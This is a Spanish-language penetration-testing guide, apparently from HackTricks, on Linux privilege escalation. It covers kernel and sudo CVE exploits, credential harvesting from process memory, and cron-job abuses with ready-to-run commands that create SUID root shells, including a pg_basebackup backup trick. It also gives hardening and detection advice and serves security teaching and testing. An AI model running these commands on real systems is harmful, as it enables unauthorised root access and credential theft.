# Escalada de privilegios en Linux

{{#include ../../../banners/hacktricks-training.md}}

Para obtener más contexto y consultar flujos históricos de enumeración, compara los recursos g0tmi1k, Payatu, SANS, LPE Workshop, Linux-Privilege-Escalation y linux-private-i que aparecen en las referencias.<sup>[[5]](#references)[[6]](#references)[[7]](#references)[[10]](#references)[[11]](#references)[[13]](#references)</sup>

## Información del sistema

### Información del SO

Empecemos por obtener información sobre el sistema operativo en ejecución.

```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```

### Path

Si **tienes permisos de escritura en alguna carpeta dentro de la variable `PATH`**, es posible que puedas secuestrar algunas bibliotecas o binarios:

```bash
echo $PATH
```

### Información del entorno

¿Información interesante, contraseñas o claves API en las variables de entorno?

```bash
(env || set) 2>/dev/null
```

### Exploits del kernel

Comprueba la versión del kernel y si hay algún exploit que pueda usarse para escalar privilegios.

La [sección Kernel/LPE/CVE](../../main-system-information/kernel-lpe-cves/README.md) recopila casos de escalada local y enlaces a análisis más detallados del kernel de Linux en Binary Exploitation. Verifica la compilación y la configuración afectadas antes de probar un caso de estudio.

```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```

Puedes encontrar una buena lista de kernels vulnerables y algunos **exploits compilados** aquí: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) y [sploits de exploitdb](https://gitlab.com/exploit-database/exploitdb-bin-sploits).<sup>[[12]](#references)</sup>\
Otros sitios donde puedes encontrar algunos **exploits compilados**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Para extraer todas las versiones vulnerables del kernel de esa web, puedes hacer lo siguiente:

```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```

Las herramientas que pueden ayudar a buscar exploits del kernel son:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (ejecutar EN la víctima; solo comprueba exploits para el kernel 2.x)

Busca siempre **la versión del kernel en Google**; quizá tu versión del kernel aparezca en algún exploit y así podrás confirmar que es válido.

Técnicas adicionales de explotación del kernel:

{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Escalada de privilegios en Linux: kernel <= 3.19.0-73.8

```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```

### Versión de Sudo

Según las versiones vulnerables de sudo que aparecen en:

```bash
searchsploit sudo
```

Puedes comprobar si la versión de sudo es vulnerable usando este grep.

```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```

### Sudo < 1.9.17p1

Sudo **1.9.14 a 1.9.17** upstream permite que usuarios locales sin privilegios escalen a root mediante la opción `--chroot` cuando sudo carga `/etc/nsswitch.conf` desde un directorio controlado por el usuario; upstream corrigió esto en **1.9.17p1**. Comprueba todos los binarios de sudo ejecutables con setuid de root en las rutas pertinentes, ya que `sudo -V` solo muestra el binario seleccionado por `PATH`. Los paquetes de las distribuciones pueden incluir la corrección retroactivamente sin cambiar la cadena de versión upstream, así que verifica también el estado del paquete del proveedor. Consulta el [aviso del mantenedor de sudo](https://www.openwall.com/lists/oss-security/2025/06/30/3).<sup>[[28]](#references)[[29]](#references)</sup>

Aquí tienes un [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) para explotar esa [vulnerabilidad](https://nvd.nist.gov/vuln/detail/CVE-2025-32463). Antes de ejecutar el exploit, asegúrate de que tu versión de `sudo` sea vulnerable y admita la función `chroot`.

Para más información, consulta el [aviso original de la vulnerabilidad](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/).<sup>[[28]](#references)</sup>

### Bypass de reglas de sudo basadas en el host (CVE-2025-32462)

Sudo **1.8.8 a 1.9.17** upstream puede evaluar reglas de sudoers basadas en el host usando el **nombre de host proporcionado por el usuario** mediante `sudo -h <host>` en lugar del **nombre de host real**; upstream corrigió esto en **1.9.17p1**. El usuario aún debe tener una entrada de sudoers coincidente en el host seleccionado. Revisa las correcciones retroactivas del proveedor y los binarios alternativos de sudo, así como la política local. Consulta el [aviso del mantenedor de sudo](https://www.openwall.com/lists/oss-security/2025/06/30/2).<sup>[[29]](#references)</sup>

Requisitos:
- Versión vulnerable de sudo
- Reglas de sudoers específicas del host (el host no es ni el nombre de host actual ni `ALL`)

Ejemplo de patrón de sudoers:

```
Host_Alias     SERVERS = devbox, prodbox
Host_Alias     PROD    = prodbox
alice          SERVERS, !PROD = NOPASSWD:ALL
```

Exploit mediante spoofing del host permitido:

```bash
sudo -h devbox id
sudo -h devbox -i
```

Si la resolución del nombre seleccionado se bloquea, verifica cómo se resuelve ese nombre en el host. Ver un nombre en un registro o archivo de configuración no significa que pueda resolverse, y modificar `/etc/hosts` normalmente requiere permisos de escritura privilegiados.

#### sudo < v1.8.28

Este [bypass de UID de Runas upstream](https://ubuntu.com/security/CVE-2019-14287) requiere una regla efectiva de sudo que permita ejecutar un comando como cualquier usuario, excepto root, como `(ALL, !root) /bin/bash`. La persona que llama también debe tener permiso para usar esa regla, incluido cualquier requisito de autenticación. Consulta el aviso del paquete instalado: los proveedores incorporaron la corrección en versiones cuyo número de versión upstream mostrado sigue siendo inferior a 1.8.28. Una regla `!root` o una versión antigua por sí solas no confirman que el sistema sea vulnerable. No pruebes un comando privilegiado durante la enumeración pasiva.

```
sudo -u#-1 /bin/bash
```

### Falló la verificación de la firma de Dmesg

Consulta la máquina **smasher2 de HTB** para ver un **ejemplo** de cómo se podría explotar esta vulnerabilidad.

```bash
dmesg 2>/dev/null | grep "signature"
```

### Más enumeración del sistema

```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```

## Enumerar posibles defensas

### AppArmor

```bash
if [ `which aa-status 2>/dev/null` ]; then
    aa-status
  elif [ `which apparmor_status 2>/dev/null` ]; then
    apparmor_status
  elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
    ls -d /etc/apparmor*
  else
    echo "Not found AppArmor"
fi
```

### Grsecurity

```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```

### PaX

```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```

### Execshield

```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```

### SElinux

```bash
 (sestatus 2>/dev/null || echo "Not found sestatus")
```

### ASLR

```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```

## Container Breakout

Si estás dentro de un contenedor, empieza con la siguiente sección sobre seguridad de contenedores y luego pasa a las páginas de abuso específicas del runtime:


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## Unidades

Comprueba **qué está montado y desmontado**, dónde y por qué. Si algo está desmontado, podrías intentar montarlo y buscar información privada.

```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```

## Software útil

Enumerar binarios útiles

```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```

Además, comprueba si **hay algún compilador instalado**. Esto es útil si necesitas usar algún exploit del kernel, ya que se recomienda compilarlo en la máquina donde vayas a utilizarlo (o en una similar).

```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```

### Software vulnerable instalado

Comprueba la **versión de los paquetes y servicios instalados**. Quizás haya una versión antigua de Nagios, por ejemplo, que pueda explotarse para escalar privilegios…\
Se recomienda comprobar manualmente la versión del software instalado que resulte más sospechoso.

```bash
dpkg -l #Debian
rpm -qa #Centos
```

Si tienes acceso SSH a la máquina, también podrías usar **openVAS** para comprobar si hay software obsoleto y vulnerable instalado en ella.

> [!NOTE] > _Ten en cuenta que estos comandos mostrarán mucha información que en su mayoría será inútil. Por lo tanto, se recomienda usar aplicaciones como OpenVAS o similares para comprobar si alguna versión del software instalado es vulnerable a exploits conocidos._

## Processes

Echa un vistazo a **qué procesos** se están ejecutando y comprueba si alguno tiene **más privilegios de los que debería** (¿quizá un tomcat ejecutado por root?).

```bash
ps aux
ps -ef
top -n 1
```

Comprueba siempre si hay [**electron/cef/chromium debuggers** en ejecución; podrías abusar de ellos para escalar privilegios](../../software-information/electron-cef-chromium-debugger-abuse.md). **Linpeas** los detecta buscando el parámetro `--inspect` en la línea de comandos del proceso.\
Comprueba también **tus permisos sobre los binarios de los procesos**; quizá puedas sobrescribir alguno.

### Cadenas de procesos padre-hijo entre usuarios

Que un proceso hijo se ejecute con un **usuario distinto** al de su padre no es automáticamente malicioso, pero es una **señal útil para el triage**. Algunas transiciones son esperadas (`root` iniciando un usuario de servicio, gestores de inicio de sesión creando procesos de sesión), pero las cadenas inusuales pueden revelar wrappers, helpers de depuración, persistencia o límites de confianza débiles en tiempo de ejecución.

Revisión rápida:

```bash
ps -eo pid,ppid,user,comm,args --sort=ppid
pstree -alp
```

Si encuentras una cadena sorprendente, inspecciona la línea de comandos del proceso padre y todos los archivos que influyen en su comportamiento (`config`, `EnvironmentFile`, scripts auxiliares, directorio de trabajo y argumentos modificables). En varias rutas reales de privesc, el proceso hijo no se podía modificar, pero sí la **configuración controlada por el proceso padre** o la cadena de scripts auxiliares.

### Ejecutables eliminados y archivos eliminados que siguen abiertos

A menudo, los artefactos en tiempo de ejecución siguen siendo accesibles **después de eliminarlos**. Esto resulta útil tanto para la escalada de privilegios como para recuperar evidencias de un proceso que ya tiene abiertos archivos sensibles.

Busca ejecutables eliminados:

```bash
pid=<PID>
ls -l /proc/$pid/exe
readlink /proc/$pid/exe
tr '\0' ' ' </proc/$pid/cmdline; echo
```

Si `/proc/<PID>/exe` apunta a `(deleted)`, el proceso sigue ejecutando desde la memoria la imagen binaria antigua. Es una señal importante que conviene investigar porque:

- el ejecutable eliminado puede contener cadenas o credenciales interesantes
- el proceso en ejecución aún puede exponer descriptores de archivo útiles
- un binario privilegiado eliminado puede indicar manipulación reciente o un intento de limpieza

Recopila globalmente los archivos abiertos que se hayan eliminado:

```bash
lsof +L1
```

Si encuentras un descriptor interesante, recupéralo directamente:

```bash
ls -l /proc/<PID>/fd
cat /proc/<PID>/fd/<FD>
```

Esto es especialmente valioso cuando un proceso todavía tiene abierto un secreto eliminado, un script, una exportación de base de datos o un archivo de flags.

### Monitorización de procesos

Puedes usar herramientas como [**pspy**](https://github.com/DominicBreuker/pspy) para monitorizar procesos. Esto puede ser muy útil para identificar procesos vulnerables que se ejecutan con frecuencia o cuando se cumplen ciertos requisitos.

#### Linux ProcMon con sudo

[ProcMon for Linux](https://github.com/microsoft/ProcMon-for-Linux) puede rastrear procesos y llamadas al sistema seleccionados y guardar un trace de SQLite. Si `sudo -l` permite ejecutar un comando `procmon` sin restricciones y con capacidad de root, considera si podría observar la entrada o la salida del proceso de otro usuario. Este permiso es solo una pista para investigar: la compatibilidad del tracer, la política efectiva y la actividad de un proceso adecuado son factores importantes. Los archivos de trace pueden contener secretos, así que inspecciona cuidadosamente las exportaciones autorizadas y evita recopilar datos de procesos no relacionados.

### Memoria de procesos

Algunos servicios de un servidor guardan **credenciales en texto plano dentro de la memoria**.\
Normalmente necesitarás **privilegios de root** para leer la memoria de procesos que pertenecen a otros usuarios, por lo que esto suele ser más útil cuando ya eres root y quieres descubrir más credenciales.\
Sin embargo, recuerda que **como usuario normal puedes leer la memoria de los procesos que te pertenecen**.

> [!WARNING]
> Ten en cuenta que actualmente la mayoría de las máquinas **no permiten ptrace de forma predeterminada**, lo que significa que no puedes volcar otros procesos que pertenezcan a tu usuario sin privilegios.
>
> El archivo _**/proc/sys/kernel/yama/ptrace_scope**_ controla la accesibilidad de ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: se pueden depurar todos los procesos, siempre que tengan el mismo uid. Esta es la forma clásica en que funcionaba ptrace.
> - **kernel.yama.ptrace_scope = 1**: solo se puede depurar un proceso padre.
> - **kernel.yama.ptrace_scope = 2**: solo un administrador puede usar ptrace, ya que requiere la capacidad CAP_SYS_PTRACE.
> - **kernel.yama.ptrace_scope = 3**: no se puede rastrear ningún proceso con ptrace. Una vez establecido, es necesario reiniciar para volver a habilitar ptrace.

Un proceso con el mismo UID que desbloquea brevemente una bóveda de contraseñas puede constituir un límite de credenciales independiente. Cuando se permite el tracing, un proceso activo que admita volcados puede exponer la contraseña de la bóveda mediante sus llamadas al sistema de entrada o su memoria, aunque el archivo cifrado de la bóveda siga protegido. `ptrace_scope=0` es solo un requisito previo: también importan que las credenciales coincidan, que el proceso objetivo admita volcados, otros módulos de seguridad de Linux y la duración del proceso. Para que una entrada de la bóveda permita iniciar sesión como root en Unix, es necesario comprobar por separado si se reutilizan las credenciales. La enumeración rutinaria debe informar de la política y de los procesos candidatos o las rutas de las bóvedas, no capturar entradas ni mostrar secretos. Consulta la [documentación de Yama del kernel](https://cdn.kernel.org/doc/html/latest/admin-guide/LSM/Yama.html) y las [comprobaciones de acceso de ptrace](https://man7.org/linux/man-pages/man2/ptrace.2.html).

#### GDB

Si tienes acceso a la memoria de un servicio FTP (por ejemplo), podrías obtener el Heap y buscar en él sus credenciales.

```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```

#### Script de GDB

```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
    | sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
    | while read start stop; do \
    gdb --batch --pid $1 -ex \
    "dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```

#### /proc/$pid/maps & /proc/$pid/mem

Para un ID de proceso determinado, **maps muestra cómo está asignada la memoria dentro del espacio de direcciones virtuales del proceso**; también muestra los **permisos de cada región asignada**. El archivo pseudo **mem expone la propia memoria del proceso**. A partir del archivo **maps**, sabemos qué **regiones de memoria son legibles** y cuáles son sus offsets. Usamos esta información para **desplazarnos por el archivo mem y volcar todas las regiones legibles** en un archivo.

```bash
procdump()
(
    cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
    while read a b; do
        dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
           skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
    done )
    cat $1*.bin > $1.dump
    rm $1*.bin
)
```

#### /dev/mem

`/dev/mem` proporciona acceso a la memoria **física** del sistema, no a la memoria virtual. Se puede acceder al espacio de direcciones virtuales del kernel mediante /dev/kmem.\
Normalmente, solo **root** y el grupo **kmem** pueden leer `/dev/mem`.

```
strings /dev/mem -n10 | grep -i PASS
```

### ProcDump para Linux

ProcDump es una reinterpretación para Linux de la clásica herramienta ProcDump de la suite de herramientas Sysinternals para Windows. Consíguela en [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)

```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```

### Herramientas

Para volcar la memoria de un proceso, puedes usar:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Puedes eliminar manualmente los requisitos de root y volcar el proceso que te pertenece
- Script A.5 de [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (se requiere root)

### Credenciales de la memoria del proceso

#### Ejemplo manual

Si encuentras que el proceso del autenticador está en ejecución:

```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```

Puedes volcar el proceso (consulta las secciones anteriores para ver distintas formas de volcar la memoria de un proceso) y buscar credenciales en la memoria:

```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```

#### mimipenguin

La herramienta [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) **robará credenciales en texto claro de la memoria** y de algunos **archivos conocidos**. Necesita privilegios de root para funcionar correctamente.

| Función                                           | Nombre del proceso   |
| ------------------------------------------------- | -------------------- |
| Contraseña de GDM (escritorio Kali, escritorio Debian) | gdm-password         |
| Gnome Keyring (escritorio Ubuntu, escritorio ArchLinux) | gnome-keyring-daemon |
| LightDM (escritorio Ubuntu)                       | lightdm              |
| VSFTPd (conexiones FTP activas)                   | vsftpd               |
| Apache2 (sesiones de autenticación HTTP Basic activas) | apache2              |
| OpenSSH (sesiones SSH activas: uso de Sudo)       | sshd:                |

#### Buscar regex/[truffleproc](https://github.com/controlplaneio/truffleproc)

```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```

## Trabajos programados/Cron

### Crontab UI (alseambusher) ejecutándose como root: privesc mediante scheduler web

Si un panel web de “Crontab UI” (alseambusher/crontab-ui) se ejecuta como root y solo está enlazado a loopback, puedes acceder igualmente mediante SSH local port-forwarding y crear un job privilegiado para escalar.<sup>[[1]](#references)[[4]](#references)</sup>

Cadena típica
- Detectar un puerto accesible solo desde loopback (p. ej., 127.0.0.1:8000) y el realm de Basic-Auth mediante `ss -ntlp` / `curl -v localhost:8000`
- Encontrar credenciales en artefactos operativos:
  - Backups/scripts con `zip -P <password>`
  - Unidad de systemd que expone `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
- Crear el túnel e iniciar sesión:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Crea un trabajo con privilegios elevados y ejecútalo inmediatamente (deja una shell SUID):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Úsalo:
```bash
/tmp/rootshell -p   # root shell
```

Hardening
- No ejecutes Crontab UI como root; usa un usuario dedicado y permisos mínimos
- Vincúlalo a localhost y restringe además el acceso mediante firewall/VPN; no reutilices contraseñas
- Evita incluir secretos en archivos de unidad; usa almacenes de secretos o un EnvironmentFile accesible solo por root
- Habilita la auditoría y el registro de ejecuciones de tareas bajo demanda

Comprueba si alguna tarea programada es vulnerable. Quizá puedas aprovecharte de un script que se ejecuta como root (¿vulnerabilidad de comodines? ¿Puedes modificar archivos que usa root? ¿Usar symlinks? ¿Crear archivos específicos en el directorio que usa root?).

```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```

Si se usa `run-parts`, comprueba qué nombres se ejecutarán realmente:

```bash
run-parts --test /etc/cron.hourly
run-parts --test /etc/cron.daily
```

Esto evita falsos positivos. Un directorio periódico con permisos de escritura solo es útil si el nombre de archivo de tu payload coincide con las reglas locales de `run-parts`.

### Ruta de cron

Por ejemplo, dentro de _/etc/crontab_ puedes encontrar el PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Observa que el usuario "user" tiene permisos de escritura sobre /home/user_)

Si el usuario root intenta ejecutar algún comando o script desde este crontab sin establecer la ruta. Por ejemplo: _\* \* \* \* root overwrite.sh_\
Entonces, puedes obtener una shell de root usando:

```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```

### Cron usando un script con un comodín (Wildcard Injection)

Si un script ejecutado por root tiene un “**\***” dentro de un comando, podrías explotarlo para hacer cosas inesperadas (como privesc). Ejemplo:

```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```

**Si el wildcard está precedido por una ruta como** _**/some/path/\***_ **, no es vulnerable (ni siquiera** _**./\***_ **).**

Lee la siguiente página para conocer más trucos de explotación de wildcards:


{{#ref}}
../../interesting-files-permissions/wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection en parsers de logs de cron

Bash puede interpretar texto no confiable como una expresión aritmética. En determinados contextos de Bash, un índice de array dentro de esa expresión puede evaluar una sustitución de comandos. Si un parser privilegiado introduce texto de logs controlado por el atacante en una comparación aritmética, la sustitución puede ejecutarse con la identidad del parser.<sup>[[22]](#references)</sup> Esto depende de la expresión exacta de Bash y de la versión; una cadena `$(...)0` aislada dentro de una variable expandida no es, por sí sola, una demostración fiable de reevaluación.

La entrada también puede proceder de metadatos de archivo o de otro campo leído desde una ubicación en la que el usuario pueda escribir. Por ejemplo, un script de limpieza privilegiado que lee una etiqueta `Producer` de una imagen y la compara con `[[ "$producer" -eq "expected" ]]` realiza una comparación aritmética, aunque la variable esté entre comillas. Determina la identidad bajo la que se ejecuta la tarea programada, qué archivos pueden proporcionar la etiqueta, qué transformaciones se aplican antes de la comparación y cuál es el comportamiento exacto de Bash. Para etiquetas de texto, usa una comparación de cadenas; para números, valida que la entrada contenga solo dígitos decimales antes de realizar operaciones aritméticas. Consulta las [reglas aritméticas de Bash](https://www.gnu.org/software/bash/manual/html_node/Shell-Arithmetic.html).

- Patrón típicamente vulnerable:
  ```bash
  #!/bin/bash
  # Example: parse a log and "sum" a count field coming from the log
  while IFS=',' read -r ts user count rest; do
      # count is untrusted if the log is attacker-controlled
      (( total += count ))     # or: let "n=$count"
  done < /var/www/app/log/application.log
  ```

- Sondeo seguro del comportamiento local del mecanismo de subíndice de array (sin proceso privilegiado ni cambios en archivos):
  ```bash
  code='x[$(printf marker >&2)]'
  [[ 200 -eq "$code" ]]
  # Bash may print "marker" while evaluating the arithmetic operand.
  ```

Rastrea el script programado real y la ruta literal de entrada que abre. Aunque el archivo de log no tenga permisos de escritura, un usuario que pueda escribir y atravesar su directorio padre, si no tiene el sticky bit, podría reemplazar su entrada de directorio; `namei -l` ayuda a distinguir esos permisos. Una ruta de log diferente que sí permita escritura, un scheduler ilegible o un parser que nunca evalúe ese campo como aritmética de Bash no demuestran que esta vía sea posible.

### Sobrescritura de cron script y symlink

Si **puedes modificar un cron script** ejecutado por root, puedes obtener una shell muy fácilmente:

```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```

Si el script ejecutado por root usa un **directorio al que tienes acceso total**, quizá sea útil eliminar esa carpeta y **crear una carpeta symlink a otra** que contenga un script controlado por ti.

```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```

### Validación de symlinks y manejo más seguro de archivos

Al revisar scripts/binarios con privilegios que leen o escriben archivos mediante una ruta, verifica cómo manejan los enlaces:

- `stat()` sigue un symlink y devuelve los metadatos del destino.
- `lstat()` devuelve los metadatos del propio enlace.
- `readlink -f` y `namei -l` ayudan a resolver el destino final y muestran los permisos de cada componente de la ruta.

```bash
readlink -f /path/to/link
namei -l /path/to/link
```

Para los defensores/desarrolladores, algunos patrones más seguros contra trucos con symlinks incluyen:

- `O_EXCL` con `O_CREAT`: falla si la ruta ya existe (bloquea enlaces/archivos creados previamente por un atacante).
- `openat()`: opera en relación con un descriptor de archivo de un directorio de confianza.
- `mkstemp()`: crea archivos temporales de forma atómica con permisos seguros.

### Binarios cron con firmas personalizadas y payloads escribibles
Un usuario ordinario que puede escribir en el binario exacto que ejecuta un trabajo cron de root puede cruzar un límite de privilegios, pero una comprobación de firma personalizada puede rechazar un reemplazo sin firmar. En el caso documentado, el ELF propiedad de root tenía el modo `0760`, lo que permitía a un miembro de su grupo escribir en él, mientras que el propietario root podía ejecutarlo. Un rastro visible de procesos mostró que `objcopy` extraía `.text_sig` antes de que el trabajo ejecutara el binario; el script verificador completo no era legible.<sup>[[2]](#references)</sup>

El reemplazo que tuvo éxito se firmó con material privado de firma filtrado mediante un firmante de ELF. Su [documentación del formato](https://github.com/NUAA-WatchDog/linux-elf-binary-signer) describe una sección de firma derivada de `.text` del ejecutable. No se demuestra que añadir simplemente un certificado o una cadena coincidente a `.text_sig` satisfaga al verificador no visible. Comprueba la ruta programada real, el acceso efectivo de escritura, la invocación de root y la política del verificador antes de concluir que un binario firmado que permite escritura es explotable. Una sección `.text_sig` por sí sola es únicamente una pista para la revisión.

### Tareas cron frecuentes

Puedes monitorizar los procesos para buscar procesos que se ejecuten cada 1, 2 o 5 minutos. Tal vez puedas aprovecharlo para escalar privilegios.

Por ejemplo, para **monitorizar cada 0.1 s durante 1 minuto**, **ordenar por los comandos ejecutados con menos frecuencia** y eliminar los comandos que se hayan ejecutado más veces, puedes hacer:

```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```

**También puedes usar** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (supervisará y enumerará cada proceso que se inicie).

### Backups de root que conservan los bits de modo establecidos por el atacante (pg_basebackup)

Si un cron propiedad de root ejecuta `pg_basebackup` (o cualquier copia recursiva) sobre un directorio de base de datos en el que puedes escribir, puedes colocar un **binario SUID/SGID** que se volverá a copiar como **root:root**, conservando los mismos bits de modo, en el destino del backup.<sup>[[26]](#references)</sup>

Flujo típico de descubrimiento (como usuario de base de datos con pocos privilegios):
- Usa `pspy` para detectar un cron de root que ejecuta algo como `/usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/` cada minuto.
- Confirma que puedes escribir en el clúster de origen (p. ej., `/var/lib/postgresql/14/main`) y que el destino (`/opt/backups/current`) queda bajo la propiedad de root después de ejecutarse la tarea.

Exploit:

```bash
# As the DB service user owning the cluster directory
cd /var/lib/postgresql/14/main
cp /bin/bash .
chmod 6777 bash

# Wait for the next root backup run (pg_basebackup preserves permissions)
ls -l /opt/backups/current/bash  # expect -rwsrwsrwx 1 root root ... bash
/opt/backups/current/bash -p    # root shell without dropping privileges
```

Esto funciona porque `pg_basebackup` conserva los bits de permisos de archivo al copiar el clúster; cuando lo ejecuta root, los archivos de destino heredan **la propiedad de root + SUID/SGID elegido por el atacante**. Cualquier rutina similar de copia o backup con privilegios que conserve los permisos y escriba en una ubicación ejecutable es vulnerable.

### Trabajos cron invisibles

Es posible crear un trabajo cron **poniendo un retorno de carro después de un comentario** (sin carácter de salto de línea), y el trabajo cron funcionará. Ejemplo (observa el carácter de retorno de carro):

```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```

Para detectar este tipo de entrada sigilosa, inspecciona los archivos cron con herramientas que muestren los caracteres de control:

```bash
cat -A /etc/crontab
cat -A /etc/cron.d/*
sed -n 'l' /etc/crontab /etc/cron.d/* 2>/dev/null
xxd /etc/crontab | head
```

## Servicios

### Archivos _.service_ modificables

